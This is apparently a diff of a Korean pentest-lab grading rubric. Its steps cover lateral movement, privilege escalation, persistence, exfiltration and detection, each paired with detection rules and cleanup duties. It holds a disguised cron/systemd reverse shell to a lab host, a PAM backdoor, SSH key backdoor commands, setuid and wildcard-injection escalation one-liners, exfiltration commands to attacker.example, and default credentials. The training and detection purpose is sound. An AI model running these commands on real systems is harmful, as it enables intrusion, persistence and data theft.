+      - "MITRE ATT&CK Lateral Movement — echo '[T1078 Valid Accounts]'; echo '  .001 Default Accounts'; echo '  .002 Domain Accounts'; echo '  .003 Local Accounts ← 본 step (ccc:1)'; echo '  .004 Cloud Accounts'; echo '[T1021 Remote Services]'; echo '  .001 RDP'; echo '  .002 SMB/Windows Admin Shares'; echo '  .004 SSH ← 본 step'; echo '[T1550 Pass the X]'; echo '  .002 Pass the Hash (NTLM)'; echo '  .003 Pass the Ticket (Kerberos)'. 출력: ATT&CK 매핑. 해석: 본 step = T1078.003 + T1021.004 결합. 학생이 보고서 작성 시 표준 ID 인용."
+      - "탐지 — auth.log + sshd 로그 — echo '[secu auth.log]'; ssh ccc@10.20.30.1 'sudo tail -10 /var/log/auth.log 2>/dev/null | grep -E \"sshd|Accepted|Failed\"' 2>/dev/null | head -10; echo '[탐지 시그니처]'; echo '  Accepted password for ccc from 10.20.30.80 → 의심 (web → secu 비정상)'; echo '  Wazuh rule_id 5715 (sshd: Login)'; echo '  Suricata SID 2010937 (SSH brute force)'. 출력: auth.log + 탐지 시그니처. 해석: SSH 측면 이동 = auth.log 에 흔적. SOC 가 학습한 시그니처는 web→secu 같은 비정상 경로 탐지."
+      - "방어 — 분리 인증 + bastion + MFA — echo '[1. 호스트별 고유 비번]'; echo '  - secrets manager (Vault/1Password)'; echo '  - 자동 rotation (90일)'; echo '[2. SSH 키 기반 인증 강제]'; echo '  - PasswordAuthentication no (sshd_config)'; echo '  - 키마다 passphrase + ssh-agent'; echo '[3. Bastion + Jump Server]'; echo '  - 모든 ssh = bastion 경유 (감사 로그)'; echo '  - Teleport / StrongDM'; echo '[4. MFA]'; echo '  - PAM + Google Authenticator'; echo '  - SSH key + TOTP'; echo '[5. Network segmentation]'; echo '  - web ↔ secu 직통 차단 / bastion 만 허용'. 출력: 5 layer. 해석: 본 lab 의 시나리오 = 가장 흔한 측면 이동. 5 layer 결합 = 효과적 차단."
       negative_signs:
-      - 중첩 없음
-      - 재사용 인식 없음
-      - 단일 hop
+      - 중첩 SSH (web → secu) 누락
+      - 자격증명 재사용 인식 X
+      - 단일 hop만 (2 hop 이상 필수)
+      - sshpass / ssh -J / ssh-copy-id 도구 1개 미만
+      - 자격증명 재사용 매트릭스 (4 호스트 sweep) X
+      - MITRE T1078.003 + T1021.004 매핑 X
+      - 방어 (분리 인증 + bastion + MFA) 5 layer 누락
   target_vm: attacker
 - order: 7
   instruction: 'Phase 4 - 권한 정보 수집: web 서버에서 권한 상승 벡터를 열거하라. sudo, SUID, capabilities를 한 번에 검사하라.'
@@ -217,13 +271,23 @@ steps:
       - find -perm -4000 + getcap
       - cron.d 검사
       acceptable_methods:
-      - 통합 열거 명령
-      - LinPEAS auto
-      - linux-exploit-suggester
+      - "sudo 권한 검사 (sudo -l) — ssh ccc@10.20.30.80 'echo 1 | sudo -S -l 2>/dev/null | tail -10' 2>/dev/null; echo '---'; echo '[GTFOBins 검색]'; echo '  https://gtfobins.github.io/'; echo '  - sudo 가능 명령 → 권한 상승 PoC'; echo '  - 예: sudo find . -exec /bin/sh \\; -quit'. 출력: sudo 가능 명령 + GTFOBins. 해석: sudo -l = 현재 사용자 sudo 권한 list. NOPASSWD 항목 = 즉시 root. find/vim/awk 등 'shell escape' 가능 명령 우선."
+      - "SUID 비트 검색 (find -perm) — ssh ccc@10.20.30.80 'find / -perm -4000 -type f 2>/dev/null | head -10' 2>/dev/null; echo '---'; echo '[정상 SUID]'; echo '  /usr/bin/passwd / /usr/bin/sudo / /bin/su'; echo '[비정상 SUID]'; echo '  /usr/bin/find / /usr/bin/vim / /usr/bin/awk → GTFOBins'; echo '[익스플로잇]'; echo '  ./vulnerable_suid → setuid(0) → /bin/sh root'. 출력: SUID 파일 + 분류. 해석: SUID = setuid bit (실행자 → 소유자 권한). root 소유 SUID = 익스플로잇 시 root. -perm -4000 = SUID flag."
+      - "Capabilities 검사 (getcap -r) — ssh ccc@10.20.30.80 'getcap -r / 2>/dev/null' 2>/dev/null | head -10; echo '---'; echo '[위험 capability]'; echo '  cap_setuid = setuid syscall → root 변경'; echo '  cap_dac_read_search = 모든 파일 읽기 (/etc/shadow)'; echo '  cap_sys_admin = 거의 root'; echo '[익스플로잇]'; echo '  python3 -c \"import os; os.setuid(0); os.system(\\\"/bin/sh\\\")\"'. 출력: capability list + 분류. 해석: capabilities = 세분화된 root 권한. cap_setuid 부여된 binary = setuid 호출 가능 → root."
+      - "Cron + 쓰기 가능 검사 — ssh ccc@10.20.30.80 'ls -la /etc/cron.d/ /etc/cron.hourly/ /etc/cron.daily/ 2>/dev/null; echo \"---\"; cat /etc/crontab 2>/dev/null; echo \"---\"; find / -writable -path /proc -prune -o -type f -print 2>/dev/null | head -10' 2>/dev/null. 출력: cron 파일 + 쓰기 가능 파일. 해석: 사용자 쓰기 가능한 cron script = 다음 실행 시 익스플로잇. /etc/cron.d/ 파일이 root 실행 → 변조하면 root."
+      - "PATH abuse + Wildcard injection — ssh ccc@10.20.30.80 'echo $PATH; sudo -l 2>/dev/null | grep -i \"env_keep\\|secure_path\"' 2>/dev/null; echo '---'; echo '[PATH 변조]'; echo '  사용자 PATH 우선 → 가짜 binary'; echo '  예: echo \"#!/bin/sh\" > /tmp/ls; export PATH=/tmp:$PATH'; echo '[Wildcard injection]'; echo '  cron: tar czf backup.tgz *'; echo '  공격: touch -- \"--checkpoint=1 --checkpoint-action=exec=sh shell.sh\"'. 출력: PATH 분석. 해석: PATH 가 사용자 디렉토리 포함 시 변조 가능. tar/cp/rsync 의 wildcard = 옵션 주입."
+      - "LinPEAS 자동 — ssh ccc@10.20.30.80 'curl -sL https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh -o /tmp/linpeas.sh 2>/dev/null && bash /tmp/linpeas.sh -q -a 2>/dev/null | head -50' 2>/dev/null || echo '[가상 — LinPEAS 결과]'; echo '[색상 분류]'; echo '  RED+YELLOW = 99% root'; echo '  RED = 가능성 높음'; echo '  YELLOW = 흥미로움'; echo '[분야]'; echo '  System / Users / Software / Permissions / Network / Files'. 출력: LinPEAS 흐름. 해석: LinPEAS = PEASS-ng 의 Linux 자동 PrivEsc 스캐너. 30+ 검사 자동. 색상으로 위험도 분류."
+      - "linux-exploit-suggester (커널 익스플로잇) — ssh ccc@10.20.30.80 'uname -a; uname -r' 2>/dev/null; echo '---'; echo '[linux-exploit-suggester]'; echo '  curl -sL ... -o les.sh && bash les.sh'; echo '[커널 버전 → CVE]'; echo '  Linux 5.4-5.7 → DirtyPipe (CVE-2022-0847)'; echo '  Linux 4.x → DirtyCOW (CVE-2016-5195)'; echo '  Linux 5.10 → PwnKit (CVE-2021-4034)'; echo '[Exploit-DB]'; echo '  searchsploit linux kernel 5.10'. 출력: 커널 + CVE 매핑. 해석: 마지막 수단 = 커널 익스플로잇. uname -r 로 정확한 버전 확인. Exploit-DB 또는 searchsploit 검색."
+      - "PEAS-style 통합 + 분석 — ssh ccc@10.20.30.80 'echo \"=== sudo ===\"; sudo -l 2>/dev/null; echo \"=== SUID ===\"; find / -perm -4000 -type f 2>/dev/null | head -5; echo \"=== Capabilities ===\"; getcap -r / 2>/dev/null | head -5; echo \"=== Writable cron ===\"; ls -la /etc/cron.d/; echo \"=== Sensitive files ===\"; ls -la /etc/passwd /etc/shadow 2>/dev/null' 2>/dev/null; echo '[종합 분석]'; echo '1. sudo NOPASSWD vim → vim :!sh = root'; echo '2. SUID find → ./find . -exec sh \\;'; echo '3. cap_setuid python → setuid(0)'; echo '4. writable cron → 5분 후 root cron 실행'. 출력: 5 벡터 통합 + 익스플로잇 추천. 해석: 모든 벡터 점검 후 가장 빠른 경로 선택."
       negative_signs:
-      - 벡터 1개만
-      - 체계 검사 없음
-      - 결과 분석 없음
+      - sudo + SUID + Capabilities 3종 미만
+      - find -perm -4000 + getcap 누락
+      - cron.d / writable 검사 X
+      - LinPEAS / linux-exploit-suggester 자동 도구 0개
+      - GTFOBins / Exploit-DB 인용 X
+      - 커널 익스플로잇 (CVE) 매핑 누락
+      - PATH abuse / Wildcard injection 미언급
+      - 익스플로잇 추천 (벡터별 PoC) X
   target_vm: attacker
 - order: 8
   instruction: 'Phase 5 - 지속성: web 서버에 SSH 키 기반 백도어를 설치하라. 비밀번호 변경 후에도 접근이 유지되는지 확인하라.'
@@ -248,13 +312,23 @@ steps:
       - Persistence established 키워드
       - 키 인증 검증 (-i)
       acceptable_methods:
-      - SSH key + authorized_keys
-      - PAM 모듈 백도어
-      - systemd 서비스 백도어
+      - "SSH 키 생성 (ed25519) — ssh-keygen -t ed25519 -f /tmp/pentest_key -N '' -q -C 'pentest@2026-04-29'; ls -l /tmp/pentest_key /tmp/pentest_key.pub; echo '---'; cat /tmp/pentest_key.pub. 출력: 키 쌍 + 공개키. 해석: ed25519 = 가장 안전·빠름 (vs RSA 2048). -N '' = passphrase 없음 (자동화). -C = comment (식별 라벨). 공개키만 등록하면 비번 없이 접속."
+      - "authorized_keys 등록 — cat /tmp/pentest_key.pub | ssh ccc@10.20.30.80 'mkdir -p ~/.ssh; cat >> ~/.ssh/authorized_keys; chmod 600 ~/.ssh/authorized_keys' 2>/dev/null && echo '[OK] 키 등록'; ssh ccc@10.20.30.80 'wc -l ~/.ssh/authorized_keys; tail -1 ~/.ssh/authorized_keys' 2>/dev/null. 출력: 키 등록 확인 + 라인 수. 해석: ~/.ssh/authorized_keys = 공개키 list. cat >> = append. chmod 600 (소유자만) = sshd 보안 요구. 권한 잘못 시 sshd 거부."
+      - "키 인증 검증 — ssh -i /tmp/pentest_key -o StrictHostKeyChecking=no ccc@10.20.30.80 'echo \"Persistence established: $(whoami)@$(hostname) at $(date +%FT%T%z)\"' 2>/dev/null. 출력: 'Persistence established: ccc@web at 2026-04-29T...'. 해석: -i = identity file 지정. -o StrictHostKeyChecking=no = known_hosts 미검증 (자동화). 비번 입력 없음 = 키 인증 성공."
+      - "비번 변경 후 접근 유지 — ssh ccc@10.20.30.80 'echo \"ccc:NewSecurePass2026\" | sudo chpasswd 2>/dev/null' 2>/dev/null; echo '[비번 변경 후]'; sshpass -p '1' ssh -o StrictHostKeyChecking=no ccc@10.20.30.80 'hostname' 2>/dev/null && echo 'ERROR: 옛 비번 통과 (정상이면 fail)' || echo '[OK] 옛 비번 차단됨'; ssh -i /tmp/pentest_key -o StrictHostKeyChecking=no ccc@10.20.30.80 'echo \"키 백도어 통과: $(date)\"' 2>/dev/null. 출력: 옛 비번 fail / 키는 통과. 해석: 비번 변경 무관. 키 백도어 = 가장 강력한 지속성. 명시적 키 삭제 외 차단 X."
+      - "PAM 모듈 백도어 — echo '[PAM auth_unix bypass — 학습용]'; cat <<'EOF'\\n# 가상 — 실 시스템 변경 X\\nauth sufficient pam_succeed_if.so user = backdoor_user\\nauth required pam_unix.so\\nEOF\\necho '[배치]'; echo '  /etc/pam.d/sshd 또는 /etc/pam.d/common-auth'; echo '[효과] backdoor_user = 비번 무관 통과'; echo '[탐지]'; echo '  - aide / tripwire 무결성 검사'; echo '  - sshd 로그 PAM 모듈 추적'. 출력: PAM 룰 + 효과. 해석: PAM = Pluggable Auth Module. /etc/pam.d/* 변조 = 모든 인증 우회. T1543.001 PAM Backdoor. 본 lab 가상 — 실 변경 X."
+      - "Cron + systemd 백도어 — echo '[Cron 백도어]'; cat <<'EOF'\\n# /etc/cron.d/system-update — 위장\\n*/5 * * * * root /tmp/.hidden_backdoor.sh\\nEOF\\necho '[/tmp/.hidden_backdoor.sh]'; cat <<'EOF'\\n#!/bin/bash\\nbash -i >& /dev/tcp/10.20.30.201/4444 0>&1\\nEOF\\necho '[systemd 서비스]'; cat <<'EOF'\\n# /etc/systemd/system/system-monitor.service\\n[Unit]\\nDescription=System Monitor\\n[Service]\\nExecStart=/tmp/.hidden_backdoor.sh\\nRestart=always\\n[Install]\\nWantedBy=multi-user.target\\nEOF. 출력: cron + systemd 백도어 룰. 해석: T1053.003 Cron / T1543.002 Systemd Service. reboot 시에도 자동 시작. 가장 흔한 지속성."
+      - "MITRE T1098.004 + 탐지 — echo '[MITRE T1098.004 Account Manipulation: SSH Authorized Keys]'; echo '[탐지 — auditd]'; echo '  -w /home/ccc/.ssh/authorized_keys -p wa -k authorized_keys_change'; echo '[탐지 — Wazuh]'; echo '  rule_id 5715: sshd: Public key auth from new IP'; echo '[탐지 — EDR]'; echo '  - 새 SSH key 추가 이벤트'; echo '  - authorized_keys 무결성 변화'; echo '[탐지 — SIEM]'; echo '  index=auth source=auth.log \"Accepted publickey\" | stats count by user,host,src_ip'. 출력: 4 layer 탐지. 해석: 백도어 등록 자체는 즉시 발견 가능 (auditd watch). 운영 환경 = 정기 audit + EDR."
+      - "정리 의무 (PTES Cleanup) — echo '[모의해킹 종료 시 정리 — 의무]'; echo '1. authorized_keys 에서 백도어 키 제거'; echo '   ssh ccc@web \"sed -i \\\"/pentest@2026/d\\\" ~/.ssh/authorized_keys\"'; echo '2. 로컬 키 파일 제거'; echo '   rm -f /tmp/pentest_key /tmp/pentest_key.pub'; echo '3. 시스템 원상 복구 검증'; echo '   ssh ccc@web \"wc -l ~/.ssh/authorized_keys\" → 원래 줄 수'; echo '4. 보고서에 정리 내역 명시'; echo '[법적 의무]'; echo '  PTES Pre-engagement RoE: \"테스터는 모든 아티팩트 제거\"'; echo '  미정리 → 계약 위반 + 형사 책임 가능'. 출력: 정리 절차. 해석: step 13 의 cleanup 단계와 연계. 모의해킹 윤리의 핵심."
       negative_signs:
-      - 키 생성 없음
-      - 검증 없음
-      - 모의해킹 정리 의무 누락
+      - ssh-keygen 명령 누락
+      - authorized_keys 등록 X
+      - 키 인증 검증 (-i 옵션) 누락
+      - 비번 변경 후 접근 유지 시연 X
+      - PAM / cron / systemd 다른 백도어 비교 0개
+      - MITRE T1098.004 SSH Authorized Keys 매핑 X
+      - 탐지 (auditd / Wazuh / SIEM) 누락
+      - 정리 의무 (RoE / PTES Cleanup) 명시 X
   target_vm: attacker
 - order: 9
   instruction: 'Phase 5 - 데이터 유출 시뮬레이션: 추출한 사용자 데이터를 암호화하고 외부 전송을 시뮬레이션하라.'
@@ -281,13 +355,23 @@ steps:
       - openssl AES-256 암호화
       - 원본 vs 암호화 크기 비교
       acceptable_methods:
-      - openssl + curl 시뮬
-      - tar+gpg+rsync
-      - DNS/ICMP 시뮬
+      - "데이터 추출 (API → file) — curl -s http://10.20.30.80:3000/api/Users 2>/dev/null | python3 -c \"import sys,json; [print(u['email']) for u in json.load(sys.stdin)['data']]\" > /tmp/pentest_exfil.txt 2>/dev/null; echo '[추출 데이터]'; wc -l /tmp/pentest_exfil.txt; head -5 /tmp/pentest_exfil.txt. 출력: email list. 해석: step 5 의 SQLi 결과를 /api/Users (BOLA) 로도 추출 가능. JSON → 평문 파일. 1차 stage."
+      - "openssl AES-256-CBC 암호화 — openssl enc -aes-256-cbc -salt -in /tmp/pentest_exfil.txt -out /tmp/pentest_exfil.enc -pass pass:pentest2026 -pbkdf2 2>/dev/null; echo 'Exfiltration simulation:'; echo \"Data size: $(wc -c < /tmp/pentest_exfil.txt) bytes -> $(wc -c < /tmp/pentest_exfil.enc) bytes (encrypted)\"; file /tmp/pentest_exfil.enc. 출력: 원본 vs 암호화 크기. 해석: AES-256 = NSA Top Secret 등급. -salt = rainbow table 차단. -pbkdf2 = key derivation (brute force 대응). DPI 도 내용 분석 불가."
+      - "전송 명령 시뮬 (실 전송 X) — echo 'Transfer command (시뮬 — 실 전송 X):'; echo '  curl -X POST -F file=@/tmp/pentest_exfil.enc http://attacker.example/collect'; echo '  rsync -avz /tmp/pentest_exfil.enc attacker@attacker.example:/exfil/'; echo '  scp /tmp/pentest_exfil.enc attacker@attacker.example:/exfil/'; echo '[모의해킹 = 가능성 입증만]'. 출력: 3 전송 명령 시뮬. 해석: 실 전송 = 외부 서버 데이터 유출 = 정통망법 §49 위반 (5년/5천). 모의해킹은 명령만 작성·실 전송 X."
+      - "tar + gpg (다중 파일 + 서명) — tar czf /tmp/exfil_bundle.tar.gz /tmp/pentest_exfil.txt 2>/dev/null; gpg --batch --yes --passphrase 'pentest2026' --symmetric --cipher-algo AES256 /tmp/exfil_bundle.tar.gz 2>/dev/null; ls -l /tmp/exfil_bundle.tar.gz* 2>/dev/null; echo '[복호화]'; echo 'gpg --decrypt /tmp/exfil_bundle.tar.gz.gpg | tar xzf -'. 출력: tar.gz + gpg. 해석: tar = 다중 파일 묶음 / gpg = 비대칭/대칭 암호화. AES256 = 가장 강력. 압축 + 암호화 = 정상 zip 처럼 보임."
+      - "청크 분할 (split) — split -b 1M /tmp/pentest_exfil.enc /tmp/chunk_; ls -l /tmp/chunk_* 2>/dev/null | head -5; echo '[청크별 전송]'; echo 'for c in /tmp/chunk_*; do curl -F file=@$c http://attacker/$(basename $c); sleep 60; done'; echo '[목적]'; echo '  - DLP 가 큰 파일 차단'; echo '  - 시간 분산 (sleep 60) → IDS 회피'; echo '  - 정상 트래픽 위장'. 출력: 청크 + 전송 흐름. 해석: 1M 청크 + 60초 간격 = DLP 회피. APT 의 표준 기법. T1030 Data Transfer Size Limits."
+      - "DNS exfiltration (시뮬) — echo '[DNS 터널링 — 시뮬]'; echo '데이터 → base32 → DNS query'; head -c 100 /tmp/pentest_exfil.txt | base32 | tr -d '=' | head -c 50; echo; echo '[전송 명령 — 시뮬]'; echo 'for chunk in $(split data); do dig $chunk.attacker.example; done'; echo '[도구]'; echo '  iodine (https://github.com/yarrick/iodine)'; echo '  dnscat2'; echo '[탐지]'; echo '  - 비정상 도메인 빈도 (1k+ subdomain/hour)'; echo '  - DNS query 길이 분포 변화'. 출력: DNS 터널 흐름. 해석: T1048.003 / T1071.004. DNS 가 외부 통신 마지막 채널 → DLP 우회. 학생 직접 실행 X."
+      - "MITRE T1041 + T1567 매핑 — echo '[MITRE Exfiltration TA0010]'; echo '  T1041 Exfiltration Over C2 Channel'; echo '  T1048 Exfiltration Over Alternative Protocol'; echo '    .001 Asymmetric Encrypted Non-C2'; echo '    .002 Asymmetric Non-C2'; echo '    .003 Unencrypted Non-C2 (FTP/HTTP)'; echo '  T1567 Exfiltration Over Web Service'; echo '    .001 Code Repository (GitHub)'; echo '    .002 Cloud Storage (S3/Drive)'; echo '    .003 Text Storage (paste.bin)'; echo '  T1030 Data Transfer Size Limits (청크)'; echo '  T1573 Encrypted Channel'. 출력: ATT&CK Exfiltration. 해석: 본 step = T1041 (curl POST) + T1573.001 (AES256). 학생이 보고서 표준 ID 인용."
+      - "탐지 — DLP + 네트워크 모니터링 — echo '[DLP (Data Loss Prevention)]'; echo '  Symantec DLP / Forcepoint / Trellix'; echo '  - 정규식 (주민번호/카드번호)'; echo '  - 파일 크기 / 빈도'; echo '  - 정책 위반 시 차단'; echo '[Network]'; echo '  - Suricata: outbound 비정상 트래픽 (sid:2025033)'; echo '  - Zeek: HTTP POST 큰 body'; echo '  - NetFlow: 비정상 outbound 볼륨'; echo '[방어]'; echo '  - egress filtering (allow-list)'; echo '  - DNS over HTTPS 차단 (CDN 만 허용)'; echo '  - PCI 데이터 token화'. 출력: 3 layer 탐지. 해석: 운영 환경 = DLP + Suricata + egress allowlist. 본 lab 의 Suricata 가 전송 명령 탐지."
       negative_signs:
-      - 암호화 없음
-      - 전송 명령 없음
-      - 실제 전송 (윤리 위반)
+      - 데이터 추출 (API/SQLi) → 파일 누락
+      - openssl AES-256 암호화 X
+      - 원본 vs 암호화 크기 비교 누락
+      - 전송 명령 (curl/rsync/scp) 시뮬 X
+      - tar+gpg / 청크 분할 / DNS 변형 1개 미만
+      - MITRE T1041 / T1048 / T1567 매핑 X
+      - DLP / Suricata 탐지 누락
+      - 실 외부 전송 시도 (정통망법 위반)
   target_vm: attacker
 - order: 10
   instruction: 'Phase 6 - 은닉 확인: Suricata와 Wazuh에서 본 모의해킹 활동이 탐지되었는지 확인하라.'
@@ -313,9 +397,14 @@ steps:
       - === 구분자
       - 탐지/미탐지 평가 맥락
       acceptable_methods:
-      - fast.log + alerts.log
-      - Wazuh 대시보드 쿼리
-      - ELK Stack 검색
+      - "Suricata fast.log 확인 — echo '=== Suricata Alerts ==='; ssh ccc@10.20.30.1 'sudo tail -20 /var/log/suricata/fast.log 2>/dev/null' 2>/dev/null; echo '---'; echo '[형식] timestamp [**] [GID:SID:REV] msg [**] {Proto} src:port -> dst:port'; echo '[예시 alert]'; echo '04/29/2026-14:32:18.123456 [**] [1:2010937:5] ET SCAN Suspicious inbound to 3000 [**] {TCP} 10.20.30.201:54321 -> 10.20.30.80:3000'. 출력: Suricata alert 샘플. 해석: fast.log = 즉시 alert. eve.json = 상세 (JSON). SID 2010937 = ET (Emerging Threats) ruleset."
+      - "Wazuh alerts.log 확인 — echo '=== Wazuh Alerts ==='; sshpass -p1 ssh -o StrictHostKeyChecking=no ccc@10.20.30.100 'tail -20 /var/ossec/logs/alerts/alerts.log 2>/dev/null' 2>/dev/null; echo '---'; echo '[Wazuh format]'; echo '** Alert 1714370738.12345: - syslog,sshd,authentication_success'; echo 'Rule: 5715 (level 3) -> SSHD authentication success'; echo 'Src IP: 10.20.30.80'; echo 'User: ccc'. 출력: Wazuh alert. 해석: alerts.log = 모든 alert 시간순. Rule ID + Level (1-15) + 분류 + decoder. 5715 = sshd: Login + 6072 = pentest detection."
+      - "공격 매핑 — 어떤 alert 가 어떤 step? — printf '%-8s | %-25s | %-30s | %s\\n' 'Step' 'Phase' 'Suricata SID' 'Wazuh Rule'; printf '%-8s | %-25s | %-30s | %s\\n' '1' '정찰 (nmap)' 'ET SCAN nmap (2010937)' 'rule 533 (firewall_drop)'; printf '%-8s | %-25s | %-30s | %s\\n' '4' 'SQLi 인증 우회' 'WEB SQLi UNION (2014547)' 'rule 31103 (SQLi)'; printf '%-8s | %-25s | %-30s | %s\\n' '6' 'SSH 측면이동' 'ET SSH brute (2010935)' 'rule 5715 (sshd login)'; printf '%-8s | %-25s | %-30s | %s\\n' '8' '키 백도어' '-' 'rule 5715 + 5402 (sudo)'. 출력: 4 step 매핑. 해석: 본 lab 의 9 phase 별 어떤 보안 장비 alert 발생. 미탐지 = 보안 갭."
+      - "Suricata 통계 (jq) — ssh ccc@10.20.30.1 'sudo jq -c \"select(.event_type==\\\"alert\\\")\" /var/log/suricata/eve.json 2>/dev/null | head -10' 2>/dev/null || echo '[가상] {alert: ET SCAN, src: .201, count: 23}'; echo '---'; echo '[통계 쿼리]'; echo 'jq \".alert.signature\" eve.json | sort | uniq -c | sort -rn | head -5'; echo '[가상 결과]'; echo '  87 ET SCAN nmap'; echo '  23 WEB SQLi'; echo '  12 ET SSH brute'. 출력: 통계 쿼리. 해석: eve.json = JSON 형식 → jq 로 분석. 가장 흔한 alert top-N → 공격 패턴 식별."
+      - "Wazuh API 쿼리 — curl -s -k -u admin:admin 'https://10.20.30.100:55000/agents' 2>/dev/null | python3 -m json.tool 2>/dev/null | head -20 || echo '[가상] {agents: [{id: 001, name: web, ip: 10.20.30.80, status: active}]}'; echo '---'; echo '[Alert 검색]'; echo 'curl -s -k -u admin:admin \"https://10.20.30.100:55000/security/alerts?pretty&limit=5\"'; echo '[Wazuh Dashboard]'; echo '  https://10.20.30.100:443 (admin/admin)'; echo '  Discover → 시간 필터 → 검색'. 출력: Wazuh API + UI. 해석: REST API 로 자동화 가능. UI 는 분석가용. 본 lab 의 Wazuh = SIEM 표준."
+      - "Purple Team 검증 매트릭스 — printf '%-15s | %-12s | %s\\n' 'Phase' '탐지' '평가'; printf '%-15s | %-12s | %s\\n' '1 정찰' 'YES' 'Suricata 87 alerts ✓'; printf '%-15s | %-12s | %s\\n' '2 웹 정찰' 'PARTIAL' 'Apache log only'; printf '%-15s | %-12s | %s\\n' '3 취약점 스캔' 'YES' 'Nikto 시그니처 ✓'; printf '%-15s | %-12s | %s\\n' '4 SQLi 우회' 'YES' 'WAF + Wazuh ✓'; printf '%-15s | %-12s | %s\\n' '5 데이터 추출' 'NO' '⚠️ 보안 갭'; printf '%-15s | %-12s | %s\\n' '6 측면이동' 'YES' 'auth.log + 5715'; printf '%-15s | %-12s | %s\\n' '8 백도어' 'NO' '⚠️ 보안 갭'; printf '%-15s | %-12s | %s\\n' '9 데이터 유출' 'PARTIAL' 'DLP 미배포'. 출력: 9 phase 매트릭스. 해석: Purple Team = Red + Blue 협업. 미탐지 = 보안 갭 → 시그니처 추가 의무."
+      - "MITRE D3FEND + NIST CSF Detect — echo '[MITRE D3FEND — Defensive ATT&CK]'; echo '  D3-NTA Network Traffic Analysis (Suricata)'; echo '  D3-FA File Analysis (Wazuh fim)'; echo '  D3-PA Process Analysis'; echo '[NIST CSF Detect (DE)]'; echo '  DE.AE Anomalies and Events'; echo '  DE.CM Continuous Monitoring (Wazuh)'; echo '  DE.DP Detection Processes'; echo '[ATT&CK Datasource]'; echo '  Network Traffic / Process / File / Authentication'. 출력: D3FEND + CSF. 해석: 공격 (ATT&CK) ↔ 방어 (D3FEND) 매핑. 본 lab 의 Suricata+Wazuh = 표준 detection layer."
+      - "갭 분석 + 시그니처 추가 — echo '[발견 갭]'; echo '1. Phase 5 (UNION SQLi 데이터 추출) → 시그니처 X'; echo '2. Phase 8 (SSH 키 백도어) → authorized_keys 변경 미감지'; echo '3. Phase 9 (Exfil) → DLP 미배포'; echo '[추가 시그니처]'; cat <<'EOF'\\n# Suricata custom rule\\nalert http any any -> any any (msg:\"SQLi UNION SELECT\"; flow:established,to_server; pcre:\"/UNION\\\\s+SELECT/i\"; sid:9000001;)\\n# Wazuh local_rules.xml\\n<rule id=\"100100\" level=\"10\">\\n  <decoded_as>auditd</decoded_as>\\n  <field name=\"key\">authorized_keys_change</field>\\n  <description>SSH key backdoor detection</description>\\n</rule>\\nEOF. 출력: 갭 + 시그니처. 해석: 본 lab 의 학습 결과 = 자사 SOC 시그니처 추가 자료."
       negative_signs:
       - 단일 로그만
       - 탐지 평가 없음
@@ -347,13 +436,22 @@ steps:
       - CVSS + Severity + OWASP 매핑
       - 취약점 5개 이상
       acceptable_methods:
-      - CVSS 3.1 calculator
-      - DefectDojo Finding
-      - DREAD 모델
+      - "CVSS 3.1 vector + 점수 — echo '[CVSS 3.1 vector 형식]'; echo 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H = 9.8 Critical'; echo '---'; echo '[8 metric]'; echo '  AV (Attack Vector): N=Network L=Local A=Adjacent P=Physical'; echo '  AC (Complexity): L=Low H=High'; echo '  PR (Privileges Required): N=None L=Low H=High'; echo '  UI (User Interaction): N=None R=Required'; echo '  S (Scope): U=Unchanged C=Changed'; echo '  C/I/A (Confidentiality/Integrity/Availability): N/L/H'. 출력: vector + 8 metric. 해석: FIRST.org CVSS 3.1 사양. SQLi = AV:N (원격) + AC:L (간단) + PR:N (인증 X) + 영향 H = 9.8."
+      - "취약점 분류표 (10 vuln) — cat <<'EOF' > /tmp/vuln_classification.csv\\n#,Vulnerability,CVSS,Severity,OWASP,CWE,Source\\n1,SQL Injection (login bypass),9.8,Critical,A03,CWE-89,manual\\n2,UNION SQLi (data extraction),9.1,Critical,A03,CWE-89,manual\\n3,User data API exposure (BOLA),7.5,High,A01,CWE-862,nuclei\\n4,Credential reuse (SSH),8.1,High,A07,CWE-521,manual\\n5,Missing rate limiting,7.3,High,A07,CWE-307,Nikto\\n6,XSS (Reflected),6.1,Medium,A03,CWE-79,nuclei\\n7,Directory listing (/ftp),5.3,Medium,A05,CWE-548,Nikto\\n8,Missing security headers,5.0,Medium,A05,CWE-693,Nikto+nuclei\\n9,Version info disclosure,5.0,Medium,A05,CWE-200,Nikto\\n10,Verbose error messages,4.3,Medium,A05,CWE-209,manual\\nEOF\\necho '[Vuln Classification 10 entries]'; cat /tmp/vuln_classification.csv | column -t -s ','. 출력: 10 vuln 표. 해석: 7 컬럼 표준 (CVSS+OWASP+CWE+Source). step 3 (Phase 2 스캔) 결과 통합."
+      - "Severity 분류 (Critical/High/Medium/Low) — printf '%-12s | %-10s | %-15s | %s\\n' 'Severity' 'CVSS' '대응 기간' '예시'; printf '%-12s | %-10s | %-15s | %s\\n' 'Critical' '9.0-10.0' '1일 ~ 1주' 'SQLi/RCE'; printf '%-12s | %-10s | %-15s | %s\\n' 'High' '7.0-8.9' '1주 ~ 1개월' 'BOLA/Cred 재사용'; printf '%-12s | %-10s | %-15s | %s\\n' 'Medium' '4.0-6.9' '1 ~ 3개월' 'XSS/헤더'; printf '%-12s | %-10s | %-15s | %s\\n' 'Low' '0.1-3.9' '3 ~ 6개월' '버전 노출'; printf '%-12s | %-10s | %-15s | %s\\n' 'None' '0' '-' '-'. 출력: 5 등급. 해석: NIST SP 800-30 + FIRST CVSS 3.1. 등급별 SLA 정의."
+      - "OWASP Top 10 2021 매핑 — echo '[OWASP Top 10 2021]'; echo '  A01:2021 Broken Access Control (#1)'; echo '  A02:2021 Cryptographic Failures'; echo '  A03:2021 Injection (#3)'; echo '  A04:2021 Insecure Design'; echo '  A05:2021 Security Misconfiguration'; echo '  A06:2021 Vulnerable Components'; echo '  A07:2021 Identification & Authentication'; echo '  A08:2021 Software & Data Integrity'; echo '  A09:2021 Security Logging Failures'; echo '  A10:2021 SSRF'; echo '[본 lab 매핑]'; echo '  A01: 3건 (BOLA / 권한)'; echo '  A03: 3건 (SQLi×2 / XSS)'; echo '  A05: 4건 (헤더/dir/version/error)'. 출력: 매핑. 해석: OWASP Top 10 = 가장 흔한 웹 취약점 분류. 본 lab 발견 = A01/A03/A05/A07 4 카테고리."
